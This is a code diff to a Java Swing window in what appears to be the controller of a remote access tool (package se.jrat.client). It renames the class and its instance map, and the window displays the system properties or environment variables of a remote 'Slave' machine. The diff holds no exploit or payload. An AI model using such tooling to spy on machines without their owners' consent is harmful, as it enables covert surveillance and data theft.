@@ -8,6 +8,7 @@ import java.awt.event.WindowEvent;
 import java.io.File;
 import java.io.FileWriter;
 import java.util.HashMap;
+import java.util.Map;
 
 import javax.swing.GroupLayout;
 import javax.swing.GroupLayout.Alignment;
@@ -31,15 +32,15 @@ import se.jrat.client.utils.IconUtils;
 
 
 @SuppressWarnings("serial")
-public class FrameSystem extends BaseFrame {
+public class FrameSystemVariables extends BaseFrame {
 
 	private JPanel contentPane;
 	public JTable table;
-	public static HashMap<Slave, FrameSystem> instances = new HashMap<Slave, FrameSystem>();
+	public static final Map<Slave, FrameSystemVariables> INSTANCES = new HashMap<Slave, FrameSystemVariables>();
 	public DefaultTableModel model;
 	public Slave slave;
 
-	public FrameSystem(final int mode, Slave slave) {
+	public FrameSystemVariables(final int mode, Slave slave) {
 		super();
 		addWindowListener(new WindowAdapter() {
 			@Override
@@ -47,14 +48,14 @@ public class FrameSystem extends BaseFrame {
 				exit();
 			}
 		});
-		instances.put(slave, this);
+		INSTANCES.put(slave, this);
 		final Slave sl = slave;
 		this.slave = slave;
 		setResizable(false);
-		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystem.class.getResource("/icons/properties.png")));
+		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystemVariables.class.getResource("/icons/properties.png")));
 		setTitle("System Properties - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
 		if (mode == Constants.MODE_ENV) {
-			setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystem.class.getResource("/icons/categories.png")));
+			setIconImage(Toolkit.getDefaultToolkit().getImage(FrameSystemVariables.class.getResource("/icons/categories.png")));
 			setTitle("Environment Variables - " + "[" + slave.formatUserString() + "] - " + slave.getIP());
 		}
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
@@ -128,7 +129,7 @@ public class FrameSystem extends BaseFrame {
 	}
 
 	public void exit() {
-		instances.remove(slave);
+		INSTANCES.remove(slave);
 		setVisible(false);
 		dispose();
 	}
